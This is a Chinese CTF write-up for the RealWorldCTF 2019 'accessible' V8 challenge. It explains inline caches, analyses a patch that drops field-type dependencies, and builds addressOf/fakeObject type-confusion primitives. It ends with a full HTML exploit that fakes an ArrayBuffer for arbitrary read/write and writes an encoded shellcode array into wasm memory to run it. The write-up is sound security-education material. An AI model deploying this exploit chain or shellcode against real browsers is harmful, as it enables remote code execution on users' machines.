> 原文链接: https://www.anquanke.com//post/id/224765 


# 从RealWorldCTF Quals 2019 - accessible学习V8对property access的优化


                                阅读量   
                                **238123**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t0130ba3708afc5ea9f.jpg)](https://p3.ssl.qhimg.com/t0130ba3708afc5ea9f.jpg)



## 0x00前言

从一题学习v8引擎对property access的相关JIT优化



## 0x01 前置知识

### <a class="reference-link" name="%E7%AE%80%E4%BB%8B"></a>简介

在js中，字典类型的键称为属性(property)，如下，dict是一个对象，其中a是它的一个属性

```
var dict = `{`a:"haivk",b:"hai"`}`;
```

当你要访问a时，首先是从这个对象里面查找键的内容a，找到后从中取出其对应的值。

### <a class="reference-link" name="%E4%BC%98%E5%8C%96"></a>优化

#### <a class="reference-link" name="%E7%A9%BA%E9%97%B4%E4%BC%98%E5%8C%96"></a>空间优化

假如有多个具有相同键的对象，其排列顺序也一样，那么可以不必为每一个对象都存储这些键的值，单独存储一份键的模板，我们称之为`Shape`，比如上述的dict其键模板为

```
a
b
```

然后每个对象只需要保存一份键模板的指针即可，这样就节省了大量的空间。<br>
运行如下的代码，并打印JIT代码

```
var obj = `{`a:"haivk",b:"hai"`}`;

function  opt(o)`{`
    o.b = 1.1;
    o.a = 2.2;
    return o.b;
`}`

for(var i = 0; i &lt; 0x20000; i++)`{`
    opt(obj);
`}`
```

发现生成的JIT代码如下(部分)

```
0x38af000851a2    c2  48b88d2c2d08af380000 REX.W movq rax,0x38af082d2c8d    ;; object: 0x38af082d2c8d &lt;HeapNumber 1.1&gt;
0x38af000851ac    cc  48bf158c1408af380000 REX.W movq rdi,0x38af08148c15    ;; object: 0x38af08148c15 &lt;Object map = 0x38af0830745d&gt;
0x38af000851b6    d6  89470f         movl [rdi+0xf],rax
0x38af000851b9    d9  49c7c00000fcff REX.W movq r8,0xfffc0000
0x38af000851c0    e0  4c23c7         REX.W andq r8,rdi
0x38af000851c3    e3  41f6400804     testb [r8+0x8],0x4
0x38af000851c8    e8  0f8533020000   jnz 0x38af00085401  &lt;+0x321&gt;
0x38af000851ce    ee  49b87d2c2d08af380000 REX.W movq r8,0x38af082d2c7d    ;; object: 0x38af082d2c7d &lt;HeapNumber 2.2&gt;
0x38af000851d8    f8  4489470b       movl [rdi+0xb],r8
0x38af000851dc    fc  49c7c10000fcff REX.W movq r9,0xfffc0000
0x38af000851e3   103  4c23cf         REX.W andq r9,rdi
0x38af000851e6   106  41f6410804     testb [r9+0x8],0x4
0x38af000851eb   10b  0f85cc010000   jnz 0x38af000853bd  &lt;+0x2dd&gt;
0x38af000851f1   111  4c8bc9         REX.W movq r9,rcx
```

可以发现，这里直接用数组下标寻址的方式进行了属性的赋值和访问

```
movl [rdi+0xf],rax
 movl [rdi+0xb],r8
```

#### <a class="reference-link" name="Inline%20Caches%20(ICs)"></a>Inline Caches (ICs)

如果要多次访问字典类型的数据，那么查找键的时间耗费是比较大的，因此v8引擎使用了一种叫`Inline Caches (ICs)`的机制来缓解这种查找的时间耗费。假如有如下函数

```
function (obj) `{`
    return obj.a;
`}`
```

如果要调用该函数对同一个对象进行多次访问，那么可以将该函数里的访问过程进行优化，即不必再从查找键开始，将该键对应的数据缓存下来，这样下次访问时先校验，然后直接从缓存中加载。如下，我们对同一个对象进行了多次访问

```
var obj = `{`a:"haivk",b:"hai"`}`;

function  opt(o)`{`
    return o.b;
`}`

for(var i = 0; i &lt; 0x20000; i++)`{`
    opt(obj);
`}`

print(opt(obj));
```

对应的JIT代码如下（部分）

```
0x12f100084fd7   117  b81e000000     movl rax,0x1e
0x12f100084fdc   11c  48bee1302c08f1120000 REX.W movq rsi,0x12f1082c30e1    ;; object: 0x12f1082c30e1 &lt;NativeContext[243]&gt;
0x12f100084fe6   126  49ba00b91ce0007f0000 REX.W movq r10,0x7f00e01cb900  (LoadGlobalICTrampoline)    ;; off heap target
0x12f100084ff0   130  41ffd2         call r10
0x12f100084ff3   133  49c7c503000000 REX.W movq r13,0x3
0x12f100084ffa   13a  e841f00b00     call 0x12f100144040     ;; deopt-soft deoptimization bailout
```

可以看到最后一个print调用时，直接使用`LoadGlobalICTrampoline`函数从缓存中加载了数据，而不必再从对象中查找。<br>
与`LoadGlobalICTrampoline`对应函数是`StoreGlobalICTrampoline`，可以将数据保存到缓存中。



## 0x02 漏洞分析

### <a class="reference-link" name="patch%E7%82%B9%E5%88%86%E6%9E%90"></a>patch点分析

patch文件如下

```
diff --git a/src/compiler/access-info.cc b/src/compiler/access-info.cc
index 0744138..1df06df 100644
--- a/src/compiler/access-info.cc
+++ b/src/compiler/access-info.cc
@@ -370,9 +370,11 @@ PropertyAccessInfo AccessInfoFactory::ComputeDataFieldAccessInfo(
       // The field type was cleared by the GC, so we don't know anything
       // about the contents now.
     `}`
+#if 0
     unrecorded_dependencies.push_back(
         dependencies()-&gt;FieldRepresentationDependencyOffTheRecord(map_ref,
                                                                   descriptor));
+#endif
     if (descriptors_field_type-&gt;IsClass()) `{`
       // Remember the field map, and try to infer a useful type.
       Handle&lt;Map&gt; map(descriptors_field_type-&gt;AsClass(), isolate());
@@ -384,15 +386,17 @@ PropertyAccessInfo AccessInfoFactory::ComputeDataFieldAccessInfo(
   `}`
   // TODO(turbofan): We may want to do this only depending on the use
   // of the access info.
+#if 0
   unrecorded_dependencies.push_back(
       dependencies()-&gt;FieldTypeDependencyOffTheRecord(map_ref, descriptor));
+#endif

   PropertyConstness constness;
   if (details.IsReadOnly() &amp;&amp; !details.IsConfigurable()) `{`
     constness = PropertyConstness::kConst;
   `}` else `{`
     map_ref.SerializeOwnDescriptor(descriptor);
-    constness = dependencies()-&gt;DependOnFieldConstness(map_ref, descriptor);
+    constness = PropertyConstness::kConst;
   `}`
   Handle&lt;Map&gt; field_owner_map(map-&gt;FindFieldOwner(isolate(), descriptor),
                               isolate());
```

可以看到，patch文件通过`#if`和`#endif`将两处`unrecorded_dependencies.push_back(dependencies()-&gt;FieldTypeDependencyOffTheRecord(map_ref, descriptor));`给注释掉了，并且`constness = PropertyConstness::kConst;`将`constness`设为了`PropertyConstness::kConst`<br>
从源码中的注释

> // Store is not safe if the field type was cleared.

我们可以知道，字典对象的`property`的类型是很重要的，并且在程序中会被保存到`unrecorded_dependencies`容器里，而patch正是patch掉了这个操作，除了`Double`和`SMI`类型的对象，其他的对象的类型都不会被push到`unrecorded_dependencies`，`unrecorded_dependencies`最终包装给一个对象，然后返回

```
return PropertyAccessInfo::DataConstant(
          zone(), receiver_map, std::move(unrecorded_dependencies), field_index,
          details_representation, field_type, field_owner_map, field_map,
          holder);
```

为了方便追踪，我们用gdb动态调试，设置断点，然后运行文章开始的示例脚本

```
b AccessInfoFactory::ComputeDataFieldAccessInfo
```

此时，`unrecorded_dependencies`是空的

[![](https://p1.ssl.qhimg.com/t01223dae47b7148448.png)](https://p1.ssl.qhimg.com/t01223dae47b7148448.png)

然后return到`js-heap-broker.cc`里的`GetPropertyAccessInfo`函数里

[![](https://p3.ssl.qhimg.com/t01446453e83a30e86d.png)](https://p3.ssl.qhimg.com/t01446453e83a30e86d.png)

接着继续最终,来到`js-native-context-specialization.cc`里的`FilterMapsAndGetPropertyAccessInfos`函数

[![](https://p0.ssl.qhimg.com/t0188b87b0725cb4d87.png)](https://p0.ssl.qhimg.com/t0188b87b0725cb4d87.png)

然后来到`js-native-context-specialization.cc`里的`ReduceNamedAccess`，发现这里有引用到`dependencies()`，打印其值，是一个容器，内容为空

[![](https://p4.ssl.qhimg.com/t012d2f20b9dbfb62e2.png)](https://p4.ssl.qhimg.com/t012d2f20b9dbfb62e2.png)

到这里，发现使用`access_info.receiver_maps`来`BuildCheckMaps`

[![](https://p1.ssl.qhimg.com/t01a9bc63e8263a3ab1.png)](https://p1.ssl.qhimg.com/t01a9bc63e8263a3ab1.png)

跟进`BuildCheckMaps`函数，来到`property-access-builder.cc`里

```
void PropertyAccessBuilder::BuildCheckMaps(
    Node* receiver, Node** effect, Node* control,
    ZoneVector&lt;Handle&lt;Map&gt;&gt; const&amp; receiver_maps) `{`
  HeapObjectMatcher m(receiver);
  if (m.HasValue()) `{`
    MapRef receiver_map = m.Ref(broker()).map();
    if (receiver_map.is_stable()) `{`
      for (Handle&lt;Map&gt; map : receiver_maps) `{`
        if (MapRef(broker(), map).equals(receiver_map)) `{`
          dependencies()-&gt;DependOnStableMap(receiver_map);
          return;
        `}`
      `}`
    `}`
  `}`
.........................................................
```

跟进`DependOnStableMap(receiver_map);`函数

```
387 void CompilationDependencies::DependOnStableMap(const MapRef&amp; map) `{`
   388   if (map.CanTransition()) `{`
 ► 389     RecordDependency(new (zone_) StableMapDependency(map));
   390   `}` else `{`
   391     DCHECK(map.is_stable());
   392   `}`
   393 `}`
```

如果`map.CanTransition()`成立，就会修改`property`的类型<br>
继续跟踪，来到`graph-reducer.cc`里的`GraphReducer::Reduce`函数

```
85   auto skip = reducers_.end();
   86   for (auto i = reducers_.begin(); i != reducers_.end();) `{`
   87     if (i != skip) `{`
   88       tick_counter_-&gt;DoTick();
   89       Reduction reduction = (*i)-&gt;Reduce(node);
 ► 90       if (!reduction.Changed()) `{`
   91         // No change from this reducer.
   92       `}` else if (reduction.replacement() == node) `{`
   93         // `{`replacement`}` == `{`node`}` represents an in-place reduction. Rerun
   94         // all the other reducers for this node, as now there may be more
   95         // opportunities for reduction.
```

### <a class="reference-link" name="poc%E6%9E%84%E9%80%A0"></a>poc构造

从上述的分析可知，如果`DependOnStableMap(receiver_map);`里的`map.CanTransition()`不成立，那么`property`的类型就不会被改变，由于`const MapRef&amp; map`参数来自`access_info.receiver_maps()`，而`access_info`里的部分数据来自`unrecorded_dependencies`，而由于patch的原因，某些类型不会加入到`unrecorded_dependencies`了，那么意味着一些原本该进行类型转换的操作将不会进行。<br>
首先构造

```
var obj = `{`a:"haivk",b:"hai"`}`;

function  opt(o)`{`
    return o.a;
`}`
for(var i = 0; i &lt; 0x20000; i++)`{`
    opt(obj);
`}`
obj.a = 1.1;
print(opt(obj));
```

发现不能造成类型混淆，其JIT代码如下（部分）

```
0x23565c142c38   118  49b971404c31240e0000 REX.W movq r9,0xe24314c4071    ;; object: 0x0e24314c4071 &lt;String[#1]: a&gt;
0x23565c142c42   122  4151           push r9
0x23565c142c44   124  49b931024ab11e080000 REX.W movq r9,0x81eb14a0231    ;; object: 0x081eb14a0231 &lt;HeapNumber 1.1&gt;
0x23565c142c4e   12e  4151           push r9
0x23565c142c50   130  48bbb00d6ce27c7f0000 REX.W movq rbx,0x7f7ce26c0db0    ;; external reference (Runtime::SetNamedProperty)
0x23565c142c5a   13a  b803000000     movl rax,0x3
0x23565c142c5f   13f  488b75a8       REX.W movq rsi,[rbp-0x58]
0x23565c142c63   143  49bac0a02fe37c7f0000 REX.W movq r10,0x7f7ce32fa0c0  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; off heap target
0x23565c142c6d   14d  41ffd2         call r10
```

主要是在执行`obj.a = 1.1;`的时候没有使用优化的方法，而是使用`SetNamedProperty`的普通js方法来进行赋值，那么就不会触发到漏洞点。那么，我们在``{``}``里再包含一个``{``}``试试

```
var obj = `{`a:`{`b:"haivk"`}``}`;

function  opt(o)`{`
    return o.a.b;
`}`
for(var i = 0; i &lt; 0x20000; i++)`{`
    opt(obj);
`}`

obj.a = `{`b:2.2`}`;

print(opt(obj));
```

仍然没有发生类型混淆，查看JIT代码

```
0x3b6d7cc2dfe   19e  48b991c2313f02140000 REX.W movq rcx,0x14023f31c291    ;; object: 0x14023f31c291 &lt;String[#5]: print&gt;
0x3b6d7cc2e08   1a8  48b8000000000e000000 REX.W movq rax,0xe00000000
0x3b6d7cc2e12   1b2  4c8bc6         REX.W movq r8,rsi
0x3b6d7cc2e15   1b5  49baa0792d89ab7f0000 REX.W movq r10,0x7fab892d79a0  (LoadGlobalICTrampoline)    ;; off heap target
0x3b6d7cc2e1f   1bf  41ffd2         call r10
```

其中opt函数优化为如下，可以看到其被优化为了数组寻址的方法

```
0x3e95ea042b5b    3b  55             push rbp
0x3e95ea042b5c    3c  4889e5         REX.W movq rbp,rsp
0x3e95ea042b5f    3f  56             push rsi
0x3e95ea042b60    40  57             push rdi
0x3e95ea042b61    41  4883ec08       REX.W subq rsp,0x8
0x3e95ea042b65    45  488975e8       REX.W movq [rbp-0x18],rsi
0x3e95ea042b69    49  493b65e0       REX.W cmpq rsp,[r13-0x20] (external value (StackGuard::address_of_jslimit()))
0x3e95ea042b6d    4d  0f8630000000   jna 0x3e95ea042ba3  &lt;+0x83&gt;
0x3e95ea042b73    53  488b5510       REX.W movq rdx,[rbp+0x10]
0x3e95ea042b77    57  f6c201         testb rdx,0x1
0x3e95ea042b7a    5a  0f8449000000   jz 0x3e95ea042bc9  &lt;+0xa9&gt;
0x3e95ea042b80    60  48b9b9a6cc430b0e0000 REX.W movq rcx,0xe0b43cca6b9    ;; object: 0x0e0b43cca6b9 &lt;Map(HOLEY_ELEMENTS)&gt;
0x3e95ea042b8a    6a  48394aff       REX.W cmpq [rdx-0x1],rcx
0x3e95ea042b8e    6e  0f8541000000   jnz 0x3e95ea042bd5  &lt;+0xb5&gt;
0x3e95ea042b94    74  488b5217       REX.W movq rdx,[rdx+0x17]
0x3e95ea042b98    78  488b4217       REX.W movq rax,[rdx+0x17]
0x3e95ea042b9c    7c  488be5         REX.W movq rsp,rbp
0x3e95ea042b9f    7f  5d             pop rbp
```

考虑到是`ICS`缓存机制的原因，`o.a.b`的类型被缓存，因此存入`1.1`时仍然是以`HOLEY_ELEMENTS`的方式将`1.1`打包为`HeapNumber`，存为了对象，那么我们尝试这样修改

```
var obj = `{`a:`{`b:"haivk"`}``}`;

function  opt(o)`{`
    return o.a.b;
`}`
for(var i = 0; i &lt; 0x20000; i++)`{`
    opt(obj);
`}`
//修改点
obj.a = `{`c:2.2`}`;

print(opt(obj));
```

上述，我们改了

```
obj.a = `{`c:2.2`}`;
```

即将a改成了另一个`Shape`形的字典对象，然后调试，可以发现，这回因为没有缓存的原因，`obj.a = `{`c:2.2`}`;`是以`unboxed double`的形式将数据写入

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t018ab59f2c132edbb3.png)

而`opt`函数仍然能够访问`obj.a.c`是因为opt被优化为了`数组寻址`的方式，并且opt中仅比较了`obj.a`的类型是否合法，而没有比较`obj.a.b`的类型

```
0x1c8800bc2b80    60  48b9b9a678b713050000 REX.W movq rcx,0x513b778a6b9    ;; object: 0x0513b778a6b9 &lt;Map(HOLEY_ELEMENTS)&gt;
0x1c8800bc2b8a    6a  48394aff       REX.W cmpq [rdx-0x1],rcx
0x1c8800bc2b8e    6e  0f8541000000   jnz 0x1c8800bc2bd5  &lt;+0xb5&gt;
0x1c8800bc2b94    74  488b5217       REX.W movq rdx,[rdx+0x17]
0x1c8800bc2b98    78  488b4217       REX.W movq rax,[rdx+0x17]
0x1c8800bc2b9c    7c  488be5         REX.W movq rsp,rbp
0x1c8800bc2b9f    7f  5d             pop rbp
```

继续运行，发现发生了类型混淆，1.1被当成一个对象地址，然后取出了一个对象

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01164ed66425905e2a.png)

由此，我们可以构造如下两个原语

```
function addressOf(obj) `{`
   var obj1 = `{`a:`{`b:1.1`}``}`;
   let f = eval(`(obj1)=&gt;`{`
      return obj1.a.b;
   `}``);
   for (var i=0;i&lt;0x20000;i++) `{`
      f(obj1);
   `}`
   obj1.a = `{`c:obj`}`;
   var addr = f(obj1);
   return u64f(addr) - 1n;
`}`

function fakeObject(addr) `{`
   var obj2 = `{`x:`{`y:buf`}``}`;
   let f = eval(`(obj2)=&gt;`{`
      return obj2.x.y;
   `}``);
   for (var i=0;i&lt;0x20000;i++) `{`
      f(obj2);
   `}`
   obj2.x = `{`z:i2f64(addr + 0x1n)`}`;
   return f(obj2);
`}`
```

### <a class="reference-link" name="%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"></a>注意事项

由于`ICS`缓存机制的原因，上述两个原语仅能使用`一次`，因为调用后，里面的字典对象相关信息会被缓存，因此想要多次利用的话，需要构造多个原语函数，并且每个函数里的字典对象的key互不相同，这里，我们也可以看到，在`addressOf`里面，我们用的是`var obj1 = `{`a:`{`b:1.1`}``}`;`，而在fakeObj里面，我们用的是`var obj2 = `{`x:`{`y:buf`}``}`;`



## 0x03 漏洞利用

本题的v8版本为`7.9.33`，在低版本中，还没有`compression pointer（指针压缩）`机制，因此`addressOf`可以直接泄露出8字节地址，然后利用fakeObj伪造一个`ArrayBuffer`实现任意地址读写，由于没有关闭`wasm`，我们可以利用任意地址读写，修改wasm的shellcode，然后执行wasm就可以执行到我们的shellcode。

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;body&gt;
    &lt;script&gt;
var buf = new ArrayBuffer(0x8);
var dv = new DataView(buf);

function p64f(value1,value2) `{`
   dv.setUint32(0,value1,true);
   dv.setUint32(0x4,value2,true);
   return dv.getFloat64(0,true);
`}`

function i2f64(value) `{`
   dv.setBigUint64(0,BigInt(value),true);
   return dv.getFloat64(0,true);
`}`

function u64f(value) `{`
   dv.setFloat64(0,value,true);
   return dv.getBigUint64(0,true);
`}`


function addressOf(obj) `{`
   var obj1 = `{`a:`{`b:1.1`}``}`;
   let f = eval(`(obj1)=&gt;`{`
      return obj1.a.b;
   `}``);
   for (var i=0;i&lt;0x20000;i++) `{`
      f(obj1);
   `}`
   obj1.a = `{`c:obj`}`;
   var addr = f(obj1);
   return u64f(addr) - 1n;
`}`

function addressOf1(obj) `{`
   var obj1 = `{`e:`{`f:1.1`}``}`;
   let f = eval(`(obj1)=&gt;`{`
      return obj1.e.f;
   `}``);
   for (var i=0;i&lt;0x20000;i++) `{`
      f(obj1);
   `}`
   obj1.e = `{`g:obj`}`;
   var addr = f(obj1);
   return u64f(addr) - 1n;
`}`


function fakeObject(addr) `{`
   var obj2 = `{`x:`{`y:buf`}``}`;
   let f = eval(`(obj2)=&gt;`{`
      return obj2.x.y;
   `}``);
   for (var i=0;i&lt;0x20000;i++) `{`
      f(obj2);
   `}`
   obj2.x = `{`z:i2f64(addr + 0x1n)`}`;
   return f(obj2);
`}`

const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);
const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var func = wasmInstance.exports.main;

var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];
var faker_addr = addressOf(faker);
print('faker_addr='+faker_addr.toString(16));
wasm_shellcode_ptr_addr = addressOf1(wasmInstance) + 0x80n;
var element_addr = faker_addr - 0x50n;
print('element_addr=' + element_addr.toString(16));
//fake a ArrayBuffer's Map
faker[0] = i2f64(0n);
faker[1] = i2f64(0x1900042317080808n);
faker[2] = i2f64(0x00000000084003ffn);
faker[3] = i2f64(0);

//faker a ArrayBuffer
faker[4] = i2f64(element_addr+0x1n); //map
faker[5] = i2f64(0); //properties
faker[6] = i2f64(0); //elements
faker[7] = p64f(0xffffffff,0); //length
faker[8] = i2f64(wasm_shellcode_ptr_addr);
faker[9] = 0x2;

var arb_ArrayBuffer = fakeObject(element_addr+0x20n);
var adv = new DataView(arb_ArrayBuffer);
var wasm_shellcode_addr = adv.getBigUint64(0,true);
print('wasm_shellcode_addr=' + wasm_shellcode_addr.toString(16));
faker[8] = i2f64(wasm_shellcode_addr);
//替换wasm的shellcode
for (var i=0;i&lt;shellcode.length;i++) `{`
   adv.setUint32(i*4,shellcode[i],true);
`}`
//%SystemBreak();
//执行shellcode
func();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
```



## 0x04 感想

通过本题加深了对v8的字典对象的理解，同时学习了`wasm`在浏览器漏洞中的利用手法。浏览器PWN虽然难但是很有趣。



## 0x05 参考

[Shapes and Inline Caches](https://mathiasbynens.be/notes/shapes-ics)<br>[[译] JavaScript 引擎基础：Shapes 和 Inline Caches](https://hijiangtao.github.io/2018/06/17/Shapes-ICs/)<br>[JavaScript engine fundamentals: optimizing prototypes](https://mathiasbynens.be/notes/prototypes)<br>[简明扼要地谈谈v8的隐藏类和Inline Cache（內联缓存](https://blog.csdn.net/cteng/article/details/77151281)
